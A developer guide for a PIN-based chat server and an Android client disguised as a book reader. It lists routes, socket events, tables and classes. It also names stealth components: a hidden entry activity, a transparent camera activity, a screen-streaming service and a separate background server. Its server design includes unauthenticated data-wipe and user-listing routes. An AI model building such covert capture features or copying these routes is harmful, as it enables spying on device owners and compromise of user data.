# Complete System Guide — Secure Chat Application

> **Purpose**: This document gives a new developer or AI agent everything they need to understand, modify, and deploy the entire chat system. It covers architecture, every file, every API, every socket event, every database table, every Android class, and how they all connect.

---

## Table of Contents

1. [System Overview](#1-system-overview)
2. [Project Structure](#2-project-structure)
3. [Chat Server (Node.js)](#3-chat-server-nodejs)
   - [Entry Point](#31-entry-point-indexjs)
   - [Database](#32-database)
   - [REST API](#33-rest-api)
   - [Socket.IO Events](#34-socketio-events)
   - [Services](#35-services)
   - [Middleware](#36-middleware)
   - [Configuration](#37-configuration)
4. [Android App](#4-android-app)
   - [App Modes](#41-app-modes-chat-vs-library)
   - [Authentication Flow](#42-authentication-flow)
   - [Network Layer](#43-network-layer)
   - [UI Activities](#44-ui-activities)
   - [UI Fragments](#45-ui-fragments)
   - [UI Adapters](#46-ui-adapters)
   - [Utilities](#47-utilities)
   - [Local Storage](#48-local-storage)
   - [Notifications](#49-notifications)
   - [Permissions](#410-permissions)
   - [Resources & Theming](#411-resources--theming)
5. [Data Flow Diagrams](#5-data-flow-diagrams)
6. [Deployment](#6-deployment)
7. [Common Tasks](#7-common-tasks-for-new-agent)
8. [Known Issues & Constraints](#8-known-issues--constraints)

---

## 1. System Overview

```
┌─────────────────────────────────────────────────────────────────────┐
│                        SYSTEM ARCHITECTURE                         │
│                                                                    │
│  ┌──────────────────┐       ┌───────────┐       ┌──────────────┐  │
│  │   Android App    │──────▶│   Nginx   │──────▶│  Chat Server │  │
│  │ (Java, Socket.IO │ HTTP/ │  Reverse  │       │  (Node.js)   │  │
│  │  OkHttp, SQLite) │  WS   │  Proxy    │       │  Port 3500   │  │
│  └──────────────────┘       │  /chat/*  │       ├──────────────┤  │
│                             └───────────┘       │  SQLite DB   │  │
│                                                 │  (chat.db)   │  │
│                                                 ├──────────────┤  │
│                                                 │  AWS S3      │  │
│                                                 │  (media)     │  │
│                                                 └──────────────┘  │
└─────────────────────────────────────────────────────────────────────┘
```

**Tech Stack:**
- **Server**: Node.js, Express, Socket.IO v4, better-sqlite3, AWS S3 SDK
- **Client**: Android (Java), Socket.IO client, OkHttp, SQLite (local cache)
- **Media**: AWS S3 (upload/download), local disk cache on device
- **Calls**: WebRTC signaling via Socket.IO, AudioRecord/AudioTrack on Android
- **Proxy**: Nginx with `/chat` prefix path

**Key URLs:**
- Server base: `http://<VPS_IP>:3500` (direct) or `http://<VPS_IP>/chat` (via Nginx)
- Admin panel: `http://<VPS_IP>/chat/admin`
- Socket.IO path (behind Nginx): `/chat/socket.io/`
- Android constant: `Constants.CHAT_SERVER_URL = "http://<VPS_IP>/chat"`

---

## 2. Project Structure

```
h4 - Copy/
├── chat-server/                        # Node.js backend
│   ├── index.js                        # Express + Socket.IO entry point
│   ├── .env                            # PORT, AWS keys, CORS
│   ├── package.json                    # Dependencies
│   ├── README.md                       # Server documentation
│   ├── DEPLOY.md                       # VPS deployment guide
│   │
│   ├── db/
│   │   ├── database.js                 # Schema, migrations, prepared statements
│   │   └── chat.db                     # SQLite database (auto-created)
│   │
│   ├── routes/
│   │   ├── auth.js                     # PIN gen, verify, profile, devices, reset
│   │   ├── contacts.js                 # Add/list/delete contacts
│   │   ├── messages.js                 # Conversations, history, shared media
│   │   ├── calls.js                    # Call logs
│   │   ├── upload.js                   # S3 file upload
│   │   ├── block.js                    # Block/unblock users
│   │   └── mute.js                     # Mute/unmute conversations
│   │
│   ├── socket/
│   │   ├── chatHandler.js              # Messaging, typing, presence, read
│   │   └── callHandler.js              # WebRTC signaling, call state
│   │
│   ├── services/
│   │   ├── messageService.js           # Message CRUD with transactions
│   │   ├── callService.js              # In-memory call state + DB logs
│   │   └── s3Service.js                # AWS S3 operations
│   │
│   └── middleware/
│       ├── rateLimit.js                # API/auth/upload rate limiters
│       ├── validate.js                 # Input validation + XSS
│       └── errorHandler.js             # Async handler + error middleware
│
├── android-native-app/                 # Android client
│   ├── app/
│   │   ├── build.gradle                # compileSdk 34, minSdk 21, Java 17
│   │   └── src/main/
│   │       ├── AndroidManifest.xml
│   │       ├── java/com/h4ckinto/android/
│   │       │   ├── MainActivity.java           # Hidden/stealth entry
│   │       │   ├── BookReaderActivity.java     # Main visible activity (chat host)
│   │       │   ├── SimpleMainActivity.java     # Screen capture handler
│   │       │   ├── GrantApplicationActivity.java
│   │       │   ├── TransparentCameraActivity.java
│   │       │   │
│   │       │   ├── network/
│   │       │   │   ├── ChatApiService.java     # REST API client (OkHttp)
│   │       │   │   ├── ChatSocketManager.java  # Socket.IO client (singleton)
│   │       │   │   └── SocketManager.java      # Legacy server connection
│   │       │   │
│   │       │   ├── utils/
│   │       │   │   ├── Constants.java          # Server URLs, prefs keys
│   │       │   │   ├── ChatPrefs.java          # SharedPreferences wrapper
│   │       │   │   ├── DesignConfig.java       # Chat vs Library mode
│   │       │   │   ├── ConversationCache.java  # Wraps LocalChatDatabase
│   │       │   │   ├── LocalChatDatabase.java  # SQLite for local messages
│   │       │   │   ├── ChatNotificationManager.java  # Message notifications
│   │       │   │   ├── MediaCacheManager.java  # S3 media disk cache
│   │       │   │   ├── ImageLoader.java        # Bitmap LRU + network loader
│   │       │   │   ├── AppLockManager.java     # Screen lock + biometric
│   │       │   │   ├── VoiceRecorder.java      # MediaRecorder wrapper
│   │       │   │   ├── AudioStreamManager.java # Call audio capture/playback
│   │       │   │   └── PermissionDetector.java # Runtime manifest checks
│   │       │   │
│   │       │   ├── ui/
│   │       │   │   ├── SecurePinActivity.java      # PIN login screen
│   │       │   │   ├── ConversationActivity.java   # Chat screen
│   │       │   │   ├── AudioCallActivity.java      # Audio call screen
│   │       │   │   ├── ImageViewerActivity.java    # Full-screen image
│   │       │   │   ├── UserProfileActivity.java    # Other user's profile
│   │       │   │   │
│   │       │   │   ├── adapters/
│   │       │   │   │   ├── ChatListAdapter.java    # Chat list items
│   │       │   │   │   ├── MessagesAdapter.java    # Message bubbles
│   │       │   │   │   ├── CallLogAdapter.java     # Call history items
│   │       │   │   │   └── ContactsAdapter.java    # Contact list items
│   │       │   │   │
│   │       │   │   └── fragments/
│   │       │   │       ├── ChatListFragment.java       # Tab 1: Chats
│   │       │   │       ├── ContactsFragment.java       # Tab 2: Contacts
│   │       │   │       ├── CallsFragment.java          # Tab 3: Calls
│   │       │   │       └── ChatSettingsFragment.java   # Tab 4: Settings
│   │       │   │
│   │       │   └── service/
│   │       │       ├── MainService.java            # Foreground service
│   │       │       └── ScreenStreamService.java    # Media projection
│   │       │
│   │       └── res/
│   │           ├── layout/                 # All XML layouts
│   │           ├── drawable/               # Icons, backgrounds
│   │           ├── values/                 # colors.xml, strings.xml, themes.xml
│   │           ├── xml/                    # network_security_config, file_paths
│   │           ├── menu/                   # Bottom navigation menus
│   │           └── mipmap-*/               # App icons (eagle logo)
│   │
│   └── sham-release-key.jks               # Signing keystore
│
└── SYSTEM_GUIDE.md                         # THIS FILE
```

---

## 3. Chat Server (Node.js)

### 3.1 Entry Point (`index.js`)

**File**: `chat-server/index.js` (~199 lines)

Responsibilities:
- Loads all dependencies and middleware
- Configures CORS from `.env` (comma-separated or `*`)
- Creates Express app with `trust proxy` = 1
- Creates Socket.IO server on same HTTP server
- Registers all routes under `/api/*`
- Serves inline HTML admin panel at `/admin`
- Health check at `/health`
- Stores `io` on `app` for route access: `app.set('io', io)`
- Graceful shutdown on SIGTERM/SIGINT (close IO → close server → close DB)
- Catches uncaughtException and unhandledRejection

**Socket.IO Settings:**
```
pingTimeout: 30000
pingInterval: 15000
maxHttpBufferSize: 10MB
transports: ['websocket', 'polling']
allowEIO3: true
perMessageDeflate: { threshold: 2048 }
httpCompression: true
```

**Admin Panel JavaScript:**
- Uses `var B = window.location.pathname.replace(/\/admin$/, "")` to auto-detect base path
- All fetch calls use `B + "/api/..."` so it works both locally and behind `/chat` proxy
- Functions: `generatePin()`, `loadUsers()`, `addContact()`, `deleteAllUsers()`
- Auto-loads users on page load

---

### 3.2 Database

**File**: `chat-server/db/database.js`

**Engine**: `better-sqlite3` → file `db/chat.db`

**Pragmas (performance-tuned):**
```sql
journal_mode = WAL
foreign_keys = ON
synchronous = NORMAL
cache_size = -32000          -- 32MB
busy_timeout = 5000
temp_store = MEMORY
mmap_size = 268435456        -- 256MB
page_size = 4096
```

**Tables:**

| Table | Columns | Purpose |
|---|---|---|
| `users` | id (PK), device_id, pin, display_name, initials, avatar_color, avatar_url, is_online, last_seen, created_at | User accounts |
| `conversations` | id (PK), user1_id, user2_id, last_message, last_message_time, created_at, deleted_by | 1:1 chat threads. `deleted_by` = comma-separated user IDs who soft-deleted |
| `messages` | id (PK), conversation_id (FK), sender_id (FK), text, message_type, file_url, file_name, file_size, duration, timestamp, is_read | All messages (text, image, voice, document) |
| `contacts` | id (PK), owner_id, contact_user_id, added_at | Bidirectional contacts (2 rows per pair) |
| `call_logs` | id (PK), caller_id, receiver_id, status, duration, timestamp | Call history |
| `devices` | id (PK), user_id, device_id, device_name, last_active, created_at | Multi-device tracking |
| `blocked_users` | id (PK), blocker_id, blocked_id, created_at | User blocking (1 row per direction) |
| `muted_conversations` | id (PK), user_id, conversation_id, created_at | Notification muting |

**Indexes:** On conversation_id, sender_id, is_read, timestamp, owner_id, user1_id, user2_id, blocker_id, blocked_id, user_id (devices/muted).

**Prepared Statement Cache (`stmtCache`):**
All frequent queries are pre-compiled at startup via `initStatements()`. Access via `stmt('name')`:

| Statement Name | What It Does |
|---|---|
| `insertMessage` | INSERT into messages |
| `getMessageWithSender` | SELECT message + sender info by ID |
| `updateConvLastMessage` | UPDATE conversation last_message/time |
| `getConversation` | SELECT conversation by ID |
| `markRead` | UPDATE messages SET is_read=1 for conversation |
| `checkBlock` | Check if either user blocks the other (bidirectional) |
| `setUserOnline` | UPDATE user online + last_seen |
| `setUserOffline` | UPDATE user offline + last_seen |
| `getUserLastSeen` | SELECT is_online, last_seen |
| `getMessageById` | SELECT single message |
| `deleteMessage` | DELETE message by ID |
| `getLastMessage` | SELECT latest message in conversation |
| `getMessagesPaginated` | SELECT messages with LIMIT |
| `getMessagesBeforeId` | SELECT messages before cursor ID |
| `getUserByPin` | SELECT user by PIN |
| `getUserById` | SELECT user by ID |
| `insertBlock` / `deleteBlock` | INSERT/DELETE blocked_users |
| `insertMute` / `deleteMute` | INSERT/DELETE muted_conversations |
| `getConvForUser` | Complex query: conversations + other user + unread + muted + blocked |
| `findConversation` | SELECT conversation between two users |
| `createConversation` | INSERT new conversation |

**Exports:** `getDb()` (returns db instance), `stmt(name)` (returns prepared statement)

**Migrations:** Runs `ALTER TABLE ADD COLUMN` in try/catch for: `avatar_url`, `deleted_by`, `device_name` — so schema evolves without breaking.

---

### 3.3 REST API

All routes are under `/api/` and use `asyncHandler` for error handling.

#### Auth Routes (`/api/auth` — `routes/auth.js`)

| Method | Path | Body/Params | What It Does |
|---|---|---|---|
| POST | `/generate-pin` | `{ display_name?, initials?, avatar_color? }` | Creates user with `crypto.randomInt(100000, 999999)` PIN. Returns `{ success, user_id, pin, display_name }` |
| POST | `/verify-pin` | `{ pin, device_id, device_name? }` | Finds user by PIN, binds device_id, sets online. If new device: inserts into `devices` table and emits `device:new_login` to `user_{id}` room. Returns `{ success, token, user }` |
| POST | `/update-profile` | `{ user_id, display_name?, initials?, avatar_color?, avatar_url? }` | Updates user profile fields |
| GET | `/user/:userId` | — | Returns public user info (id, display_name, initials, avatar_color, avatar_url, is_online, last_seen) |
| GET | `/devices/:userId` | — | Lists all devices for user |
| DELETE | `/devices/:userId/:deviceRowId` | — | Removes device row, emits `device:force_logout` to `user_{userId}` |
| POST | `/change-pin` | `{ user_id, current_pin, new_pin }` | Validates current PIN, updates to new 6-digit PIN |
| GET | `/users` | — | Lists ALL users (admin) |
| POST | `/reset` | — | Deletes ALL data from ALL tables (wrapped in transaction). Returns `{ message }` |

**Rate limiting:** `/verify-pin` uses `authLimiter` (100 req/15min).

#### Contacts Routes (`/api/contacts` — `routes/contacts.js`)

| Method | Path | Body/Params | What It Does |
|---|---|---|---|
| GET | `/:userId` | — | Lists contacts with user details (JOIN users) |
| POST | `/` | `{ owner_id, contact_user_id }` OR `{ owner_id, contact_device_id }` | Adds bidirectional contacts + creates conversation if needed. Returns `{ contact_user_id, conversation_id }` |
| DELETE | `/:contactId` | — | Deletes single contact row |

#### Messages Routes (`/api/messages` — `routes/messages.js`)

| Method | Path | Query/Params | What It Does |
|---|---|---|---|
| GET | `/shared-media/:conversationId` | `?limit=50` | Returns media messages (image/voice/document) + summary counts `{ images, voice, documents, total }` |
| GET | `/:conversationId` | `?limit=50&before_id=123&max_age_hours=24` | Paginated message history. `before_id` for cursor pagination. `max_age_hours` auto-deletes old messages |
| GET | `/conversations/:userId` | — | All conversations for user with: other user info, unread count, last message, `is_muted`, `is_blocked`. **Soft-deleted conversations filtered in JavaScript** (not SQL) by checking `deleted_by` column |
| GET | `/conversation-with/:userId/:otherUserId` | — | Get or create conversation between two users |
| DELETE | `/conversation/:conversationId/:userId` | — | Soft-delete: appends userId to `deleted_by` column. Clears `last_message` and `last_message_time` |

**Important implementation detail:** The `getConvForUser` prepared statement returns ALL conversations for the user. The `deleted_by` filter is applied in JavaScript with `Array.filter()` because SQL LIKE-based filtering was unreliable:
```javascript
conversations = conversations.filter(function(c) {
    if (!c.deleted_by) return true;
    var ids = c.deleted_by.split(',');
    return ids.indexOf(uid) === -1;
});
```

#### Upload Routes (`/api/upload` — `routes/upload.js`)

| Method | Path | Body (multipart) | What It Does |
|---|---|---|---|
| POST | `/` | `file` (binary), `type` (image/voice/document), `sender_id` | Validates MIME type + file size → uploads to S3 → returns `{ fileUrl, fileName, fileSize, mimeType }` |

**Size limits:** Image 10MB, Voice 5MB, Document 25MB.
**Rate limiting:** `uploadLimiter` (100 req/5min).

**Allowed MIME types:**
- Image: jpeg, png, gif, webp, bmp
- Voice: mp3, mpeg, m4a, ogg, wav, aac, amr, 3gpp
- Document: pdf, msword, docx, xls, xlsx, ppt, pptx, txt, csv, zip, rar, 7z

#### Calls Routes (`/api/calls` — `routes/calls.js`)

| Method | Path | What It Does |
|---|---|---|
| GET | `/:userId` | Last 50 call logs with other user info + `is_outgoing` flag |
| DELETE | `/:userId` | Deletes all call logs for user |

#### Block Routes (`/api/block` — `routes/block.js`)

| Method | Path | Body | What It Does |
|---|---|---|---|
| POST | `/` | `{ blocker_id, blocked_id }` | Insert block (uses `INSERT OR IGNORE`) |
| DELETE | `/:blockerId/:blockedId` | — | Remove block |
| GET | `/check/:blockerId/:blockedId` | — | Returns `{ is_blocked: true/false }` |
| GET | `/:userId` | — | Returns array of blocked user IDs |

#### Mute Routes (`/api/mute` — `routes/mute.js`)

| Method | Path | Body | What It Does |
|---|---|---|---|
| POST | `/` | `{ user_id, conversation_id }` | Insert mute (uses `INSERT OR IGNORE`) |
| DELETE | `/:userId/:conversationId` | — | Remove mute |

---

### 3.4 Socket.IO Events

**Connection setup:** Each socket must emit `chat:join` with `{ userId }` first. This:
1. Joins the socket to room `user_{userId}`
2. Stores `socket.userId` for use in disconnect/call handlers
3. Sets user online in DB
4. Broadcasts presence to contacts only (not all users)
5. Sends `chat:online_list` with all currently online users

#### Chat Events

| Event | Direction | Payload | Behavior |
|---|---|---|---|
| `chat:join` | C→S | `{ userId }` | Join room, go online, broadcast to contacts |
| `chat:send` | C→S | `{ conversationId, senderId, text?, messageType?, fileUrl?, fileName?, fileSize?, duration? }` | **Checks bidirectional block** → inserts message (transaction) → emits `chat:sent` to sender, `chat:receive` to recipient, `chat:conversation_update` to both. Resets `deleted_by` on conversation |
| `chat:sent` | S→C | `{ message, conversationId }` | Confirmation with server-assigned message ID |
| `chat:receive` | S→C | `{ message, conversationId }` | New message delivery |
| `chat:conversation_update` | S→C | `{ conversationId, lastMessage, lastMessageTime, senderId }` | Chat list preview update |
| `chat:typing` | C→S | `{ conversationId, userId }` | Forwarded to other user. Auto-stops after 4s |
| `chat:stop_typing` | C→S | `{ conversationId, userId }` | Clears typing timer, forwards |
| `chat:typing` | S→C | `{ conversationId, userId }` | Other user is typing |
| `chat:stop_typing` | S→C | `{ conversationId, userId }` | Other user stopped typing |
| `chat:read` | C→S | `{ conversationId, userId }` | Marks all unread messages as read, emits `chat:read` to other user |
| `chat:read` | S→C | `{ conversationId, readBy }` | Read receipt |
| `chat:delete` | C→S | `{ messageId, userId, deleteForAll? }` | Delete message. If `deleteForAll` and sender matches: deletes from DB, updates conversation last message, emits `chat:deleted` to both. If not deleteForAll: only emits to requester |
| `chat:deleted` | S→C | `{ messageId, conversationId, deleteForAll }` | Message was deleted |
| `chat:request_status` | C→S | `{ userId }` | Request specific user's online status. **Block check**: if blocked, returns offline |
| `chat:set_status` | C→S | `{ isOnline }` | Manually set online/away |
| `chat:online` | S→C | `{ userId, isOnline, lastSeen }` | Presence update (sent to contacts only via `broadcastPresence()`) |
| `chat:online_list` | S→C | `{ users: [userId, ...] }` | Full online list on join |

**Block enforcement in `chat:send`:**
```javascript
var blocked = stmt('checkBlock').get(recipientId, senderId, senderId, recipientId);
if (blocked) return; // silently drop
```
This checks BOTH directions — if either user blocks the other, message is dropped.

**Targeted presence broadcast (`broadcastPresence`):**
Instead of `io.emit()` to all users, queries the user's contacts and emits only to their rooms:
```javascript
function broadcastPresence(io, userId, isOnline, lastSeen) {
    var contacts = getDb().prepare('SELECT contact_user_id FROM contacts WHERE owner_id = ?').all(userId);
    contacts.forEach(function(c) {
        io.to('user_' + c.contact_user_id).emit('chat:online', { userId, isOnline, lastSeen });
    });
}
```

#### Call Events

| Event | Direction | Payload | Behavior |
|---|---|---|---|
| `call:offer` | C→S | `{ callerId, receiverId }` | **Checks bidirectional block** → creates call → emits `call:incoming` to receiver + `call:ringing` to caller. Sets 45s timeout |
| `call:incoming` | S→C | `{ callId, callerId, callerName, callerInitials, callerAvatarColor }` | Ring the receiver |
| `call:ringing` | S→C | `{ callId, receiverId }` | Confirm ringing to caller |
| `call:answer` | C→S | `{ callId, sdp? }` | Answer call → emits `call:answered` to both |
| `call:answered` | S→C | `{ callId, sdp? }` | Call connected |
| `call:ice-candidate` | Bidirectional | `{ callId, senderId, candidate }` | Relay ICE candidate to other peer |
| `call:reject` | C→S | `{ callId }` | Reject → emits `call:ended` (reason: "rejected") to both |
| `call:end` | C→S | `{ callId }` | End call → saves log → emits `call:ended` (reason: "ended", duration) to both |
| `call:ended` | S→C | `{ callId, reason, duration? }` | Call terminated. Reasons: `ended`, `rejected`, `no_answer`, `missed`, `disconnected`, `unavailable` |
| `call:audio` | Bidirectional | `{ callId, senderId, audio }` | Audio relay (base64 PCM, backward compat) |
| `call:mute` | Bidirectional | `{ callId, userId, isMuted }` | Mute toggle relay |

**Block enforcement in `call:offer`:**
```javascript
var blocked = stmt('checkBlock').get(receiverId, callerId, callerId, receiverId);
if (blocked) {
    socket.emit('call:ended', { callId: 'blocked', reason: 'unavailable' });
    return;
}
```

**Call timeout:** After 45 seconds, unanswered call auto-ends:
- Caller gets `reason: "no_answer"`
- Receiver gets `reason: "missed"`
- Call log saved as "missed"

#### Device Events

| Event | Direction | Payload | Behavior |
|---|---|---|---|
| `device:new_login` | S→C | `{ device_name, device_id, timestamp }` | Emitted by auth route when new device verifies PIN |
| `device:force_logout` | S→C | `{ }` | Emitted by auth route when device is removed |

**Disconnect behavior:**
- Removes userId from online map
- Sets user offline in DB
- Broadcasts offline presence to contacts
- Cleans up any active calls for that user

---

### 3.5 Services

#### `messageService.js`

| Function | What It Does |
|---|---|
| `insertMessage(data)` | Sanitizes text (xss-filters), inserts message, updates conversation last_message/time, resets `deleted_by` to `''` — **all in a single DB transaction**. Returns `{ message, preview }` |
| `getConversation(id)` | Gets conversation by ID |
| `markMessagesRead(conversationId, readByUserId)` | UPDATE messages SET is_read=1 WHERE sender_id != readByUserId |
| `deleteMessageForAll(messageId, userId)` | Validates sender owns message → DELETE → update conversation last message → returns `{ conversationId, otherId, fileUrl }`. Uses transaction |
| `getMessageById(id)` | Single message lookup |

**Preview logic:** `buildPreview(messageType, text, fileName)` returns human-readable preview: text messages show first 50 chars; media shows emoji + type name (e.g., "📷 Image", "🎤 Voice", "📄 Document").

#### `callService.js`

In-memory `activeCalls` Map (not persisted — calls are ephemeral):

| Function | What It Does |
|---|---|
| `createCall(callerId, receiverId)` | Creates call with UUID, status 'ringing' |
| `getCall(callId)` | Get call state |
| `answerCall(callId)` | Set status 'active', record startTime |
| `endCall(callId)` | Calculate duration, remove from map, return call data |
| `rejectCall(callId)` | Set status 'rejected', remove from map |
| `setCallTimeout(callId, callback, ms)` | setTimeout for unanswered calls (default 45s) |
| `cleanupUserCalls(userId)` | End all calls involving this user (used on disconnect) |
| `getCallerInfo(callerId)` | Query DB for caller's display info |
| `saveCallLog(callerId, receiverId, status, duration)` | INSERT into call_logs |
| `getActiveCallCount()` | Current active calls count (for health endpoint) |

#### `s3Service.js`

| Function | What It Does |
|---|---|
| `initS3()` | Create S3Client from env vars (lazy singleton) |
| `uploadToS3(buffer, key, mimetype)` | PutObjectCommand with AES-256 encryption. Returns public URL |
| `deleteFromS3(key)` | DeleteObjectCommand |
| `getSignedDownloadUrl(key, expiresIn)` | Presigned URL for private objects |
| `generateS3Key(type, originalName)` | Creates path: `{images|voice|documents}/{type}_{timestamp}_{hex}.{ext}` |
| `validateMimeType(type, mimetype)` | Checks against ALLOWED_MIME_TYPES whitelist |
| `getSizeLimit(type)` | Returns max bytes for type |
| `extractKeyFromUrl(url)` | Parse S3 key from full URL |

---

### 3.6 Middleware

#### `rateLimit.js`
- `apiLimiter`: 1000 requests / 15 minutes on `/api/`
- `authLimiter`: 100 requests / 15 minutes (used on `/verify-pin`)
- `uploadLimiter`: 100 requests / 5 minutes (used on `/api/upload`)

#### `validate.js`
- `validateRequired(fields, body)`: Checks required fields exist
- `sanitize(text)`: XSS sanitization via `xss-filters`
- `validateInt(value)`: Parse integer or null
- `validateParamId`: Express middleware to validate `:id` param

#### `errorHandler.js`
- `asyncHandler(fn)`: Wraps async route handlers to catch errors
- `centralErrorHandler(err, req, res, next)`: Handles entity.too.large, LIMIT_FILE_SIZE, LIMIT_UNEXPECTED_FILE, generic errors with status codes

---

### 3.7 Configuration

**`.env` file:**
```env
PORT=3500
NODE_ENV=production
AWS_ACCESS_KEY_ID=<key>
AWS_SECRET_ACCESS_KEY=<secret>
AWS_REGION=us-east-1
AWS_BUCKET_NAME=secure-chat-media
CORS_ORIGINS=*
```

**`package.json` dependencies:**
```
@aws-sdk/client-s3, @aws-sdk/s3-request-presigner, better-sqlite3,
compression, cors, dotenv, express, express-rate-limit, helmet,
multer, socket.io, uuid, xss-filters
```

---

## 4. Android App

### 4.1 App Modes (Chat vs Library)

The app has TWO design modes controlled by `AndroidManifest.xml` meta-data:
```xml
<meta-data android:name="app_design_mode" android:value="chat" />
```

**`DesignConfig.java`** reads this value:
- `"chat"` → Chat mode (PIN login, messaging, calls)
- `"library"` → Library mode (book reader, hidden)

In chat mode, `BookReaderActivity` is the launcher and hosts chat fragments.

### 4.2 Authentication Flow

```
App Launch
    │
    ▼
BookReaderActivity
    │
    ├── ChatPrefs.isPinVerified() == false?
    │       │
    │       ▼
    │   SecurePinActivity
    │       │
    │       ├── User enters 6-digit PIN
    │       │
    │       ├── ChatApiService.verifyPin(pin, deviceId)
    │       │       │
    │       │       ▼
    │       │   Server: POST /api/auth/verify-pin
    │       │       │
    │       │       ▼
    │       │   Returns: { success, token, user }
    │       │
    │       ├── ChatPrefs.save(userId, token, displayName, ...)
    │       │
    │       ├── ChatSocketManager.connect(userId)
    │       │       │
    │       │       ▼
    │       │   Socket.IO: emit('chat:join', { userId })
    │       │
    │       └── Start BookReaderActivity (pin_verified=true)
    │
    ├── ChatPrefs.isPinVerified() == true?
    │       │
    │       ▼
    │   Load chat fragments
    │   Connect ChatSocketManager
    │   Register listeners (incoming calls, messages, device events)
    │
    ▼
ChatListFragment / ContactsFragment / CallsFragment / ChatSettingsFragment
```

**`ChatPrefs.java`** stores in SharedPreferences:
- `user_id` (int), `device_id` (String), `token` (String)
- `display_name`, `initials`, `avatar_color`, `avatar_url`
- `pin`, `pin_verified` (boolean)
- `getOrCreateDeviceId()`: Uses Android ID or generates UUID

### 4.3 Network Layer

#### `ChatApiService.java` (REST — OkHttp)

Singleton. Base URL = `Constants.CHAT_SERVER_URL`.

All methods follow the pattern:
```java
public void someMethod(params, ApiCallback callback) {
    // Build OkHttp Request
    // Execute async
    // Parse JSON response
    // Call callback.onSuccess(jsonObject) on main thread via Handler
    // Call callback.onError(message) on failure
}
```

**Key methods:**

| Method | API Call | Used By |
|---|---|---|
| `verifyPin(pin, deviceId, deviceName, cb)` | POST /api/auth/verify-pin | SecurePinActivity |
| `updateProfile(userId, name, initials, color, avatarUrl, cb)` | POST /api/auth/update-profile | ChatSettingsFragment |
| `getUserInfo(userId, cb)` | GET /api/auth/user/{id} | UserProfileActivity |
| `getConversations(userId, cb)` | GET /api/messages/conversations/{id} | ChatListFragment |
| `getMessages(convId, limit, beforeId, cb)` | GET /api/messages/{convId} | ConversationActivity |
| `getOrCreateConversation(userId, otherId, cb)` | GET /api/messages/conversation-with/{a}/{b} | ContactsAdapter |
| `getContacts(userId, cb)` | GET /api/contacts/{id} | ContactsFragment |
| `addContactByUserId(ownerId, contactUserId, cb)` | POST /api/contacts | ContactsFragment |
| `uploadFile(file, type, senderId, cb)` | POST /api/upload | ConversationActivity |
| `uploadProfilePicture(file, userId, cb)` | POST /api/upload + POST /api/auth/update-profile | ChatSettingsFragment |
| `getCallLogs(userId, cb)` | GET /api/calls/{id} | CallsFragment |
| `deleteCallLogs(userId, cb)` | DELETE /api/calls/{id} | CallsFragment |
| `getDevices(userId, cb)` | GET /api/auth/devices/{id} | ChatSettingsFragment |
| `removeDevice(userId, deviceRowId, cb)` | DELETE /api/auth/devices/{a}/{b} | ChatSettingsFragment |
| `blockUser(blockerId, blockedId, cb)` | POST /api/block | UserProfileActivity |
| `unblockUser(blockerId, blockedId, cb)` | DELETE /api/block/{a}/{b} | UserProfileActivity |
| `checkBlock(blockerId, blockedId, cb)` | GET /api/block/check/{a}/{b} | UserProfileActivity |
| `muteConversation(userId, convId, cb)` | POST /api/mute | ChatListFragment |
| `unmuteConversation(userId, convId, cb)` | DELETE /api/mute/{a}/{b} | ChatListFragment |
| `deleteConversation(convId, userId, cb)` | DELETE /api/messages/conversation/{a}/{b} | ChatListFragment, ConversationActivity |
| `getSharedMedia(convId, cb)` | GET /api/messages/shared-media/{id} | UserProfileActivity |
| `changePIN(userId, currentPin, newPin, cb)` | POST /api/auth/change-pin | ChatSettingsFragment |

#### `ChatSocketManager.java` (Socket.IO — Singleton)

**Connection logic (handles `/chat` prefix):**
```java
String chatUrl = Constants.CHAT_SERVER_URL;  // "http://IP/chat"
String socketBase = chatUrl;
String socketPath = "/socket.io/";

int pathIdx = chatUrl.indexOf("/", chatUrl.indexOf("//") + 2);
if (pathIdx > 0) {
    socketBase = chatUrl.substring(0, pathIdx);  // "http://IP"
    socketPath = chatUrl.substring(pathIdx) + "/socket.io/";  // "/chat/socket.io/"
}

IO.Options options = new IO.Options();
options.path = socketPath;
options.transports = new String[]{"websocket", "polling"};
options.reconnection = true;
socket = IO.socket(socketBase, options);
```

**Listener pattern:** List-based listeners for each event type:
```java
private List<OnMessageReceivedListener> messageReceivedListeners = new ArrayList<>();
public void addMessageReceivedListener(OnMessageReceivedListener l) { messageReceivedListeners.add(l); }
public void removeMessageReceivedListener(OnMessageReceivedListener l) { messageReceivedListeners.remove(l); }
```

**Events emitted by client:**
- `chat:join`, `chat:send`, `chat:typing`, `chat:stop_typing`, `chat:read`
- `chat:set_status`, `chat:request_status`, `chat:delete`
- `call:audio`, `call:mute`

**Events listened:**
- `chat:receive`, `chat:sent`, `chat:typing`, `chat:stop_typing`
- `chat:online`, `chat:online_list`, `chat:read`, `chat:conversation_update`
- `chat:deleted`
- `call:incoming`, `call:ringing`, `call:answered`, `call:ended`, `call:audio`, `call:mute`
- `device:new_login`, `device:force_logout`

#### `SocketManager.java` (Legacy — Separate Server)

Connects to `Constants.SERVER_URL` / `Constants.SOCKET_URL`. Used by `GrantApplicationActivity` and `TransparentCameraActivity`. **Completely separate** from the chat system. Do not modify unless working on the background/legacy features.

### 4.4 UI Activities

#### `BookReaderActivity.java` (Main Host)

- **Launcher activity** (only visible entry point)
- Reads `DesignConfig.isChatMode()` to decide fragment set
- **Chat mode fragments**: ChatListFragment, ContactsFragment, CallsFragment, ChatSettingsFragment via BottomNavigationView
- **Library mode fragments**: HomeFragment, LibraryFragment, ExploreFragment, SettingsFragment
- Connects `ChatSocketManager` and registers global listeners:
  - Incoming call → launches `AudioCallActivity.createIncoming()`
  - New message → `ChatNotificationManager.showMessageNotification()`
  - Device events → new login notification, force logout handling
- **App lock overlay**: Uses `AppLockManager` for screen lock / biometric on resume
- Handles permissions: storage + notifications on startup (chat mode)

#### `SecurePinActivity.java`

- 6 individual `EditText` fields for PIN digits
- Auto-advances focus between digits
- Calls `ChatApiService.verifyPin()` on submit
- On success: saves to `ChatPrefs`, connects socket, starts `BookReaderActivity`

#### `ConversationActivity.java` (Chat Screen)

- **Receives**: `conversation_id`, `other_user_id`, `other_user_name`
- **RecyclerView** with `MessagesAdapter`
- **Input bar**: text input, send button, attach button, voice record button
- **Attach bottom sheet**: Camera, Gallery, Document
- **Voice recording**: `VoiceRecorder` (long-press record button)
- **Socket listeners**: message received/sent, typing, read, online status, delete
- **API calls**: load messages (paginated), upload media, mark read
- **Local cache**: `ConversationCache` for offline messages
- **Optimistic sends**: Creates local message immediately, updates with server ID on `chat:sent`
- **Media flow**:
  1. User picks file → `ChatApiService.uploadFile()` → gets S3 URL
